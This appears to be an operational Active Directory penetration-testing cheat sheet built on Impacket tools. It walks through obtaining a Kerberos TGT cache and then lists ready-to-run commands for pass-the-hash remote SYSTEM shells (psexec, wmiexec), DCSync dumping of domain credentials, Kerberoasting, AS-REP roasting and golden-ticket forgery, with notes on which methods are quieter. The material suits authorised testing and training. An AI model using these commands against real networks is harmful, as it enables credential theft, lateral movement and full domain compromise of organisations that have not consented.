## Current operation: Obtain and select a TGT cache

**Run in:** Kali with MIT Kerberos utilities. **Requires:** A supported account credential, correct realm/DC and the actual cache filename printed by getTGT.

```bash
impacket-getTGT 'DOMAIN_FQDN/USER' -dc-ip DC_IP
export KRB5CCNAME="$PWD/USER.ccache"
klist
```

**Read the result:** Confirm the cache contains a TGT for the intended principal/realm and note its expiry.

**If The cache exists but no valid TGT appears:** A TGT is not a service ticket. The supplied password, NT hash or AES key must match the mechanism and account.

**Next check:** Confirm the generated filename, principal and expiry, then use a Kerberos-aware service client with the matching hostname.

### Example 2: Original captured examples

Run in: **Saved lab example**.

```bash
# remote execution (need admin creds or hash)
psexec.py $DOMAIN/admin:PASS@$IP            # SYSTEM shell (noisy)
wmiexec.py $DOMAIN/admin@$IP -hashes :<nt>  # semi-interactive, quieter
smbexec.py / atexec.py / dcomexec.py        # alternatives
# credentials
secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc   # DCSync
GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request     # Kerberoast
GetNPUsers.py  $DOMAIN/ -usersfile users.txt -no-pass    # AS-REP roast
# tickets
getTGT.py $DOMAIN/USER:PASS ; export KRB5CCNAME=USER.ccache
ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   # golden
# shares / lookups
smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
```
